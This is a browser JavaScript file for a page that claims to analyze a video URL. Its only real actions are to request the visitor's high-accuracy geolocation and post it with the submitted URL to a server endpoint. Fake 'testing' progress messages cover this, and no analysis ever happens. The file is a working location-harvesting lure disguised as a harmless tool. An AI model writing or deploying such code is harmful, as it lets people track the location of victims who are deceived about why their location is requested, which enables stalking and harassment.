const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');

analyzeButton.addEventListener('click', async () => {
    const videoUrl = videoUrlInput.value.trim();
    if (!videoUrl) {
        statusText.textContent = "Please enter a valid video URL.";
        return;
    }

    statusText.textContent = 'Starting analysis...';
    progressBarContainer.style.display = 'block';
    progressBar.style.width = '10%';

    let locationData = null;

    try {
        if ("geolocation" in navigator) {
            statusText.textContent = 'Requesting location access...';
            await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        statusText.textContent = `Location retrieved: Latitude ${locationData.latitude}, Longitude ${locationData.longitude}.`;
                        console.log('Location:', locationData);
                        resolve();
                    },
                    (error) => {
                        statusText.textContent = `Location access denied or error occurred: ${error.message}.`;
                        console.error('Location error:', error);
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            });
        } else {
            statusText.textContent = "Your browser does not support geolocation.";
        }
        progressBar.style.width = '70%';

        statusText.textContent = 'Testing url please wait...';

        const response = await fetch('/api/send-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                videoUrl: videoUrl,
                location: locationData
            })
        });

        if (response.ok) {
            progressBar.style.width = '100%';
            statusText.textContent = `Testing completed successfully!`;
            setTimeout(() => {
                progressBarContainer.style.display = 'none';
                progressBar.style.width = '0%';
                videoUrlInput.value = '';
                statusText.textContent = '';
            }, 3000);
        } else {
            const errorData = await response.json();
            statusText.textContent = `Error sending data: ${errorData.message || response.statusText}`;
            progressBar.style.width = '0%';
            progressBarContainer.style.display = 'none';
        }

    } catch (err) {
        statusText.textContent = `An error occurred: ${err.message}. Please check permissions.`;
        progressBar.style.width = '0%';
        progressBarContainer.style.display = 'none';
        console.error('Error:', err);
    }
});
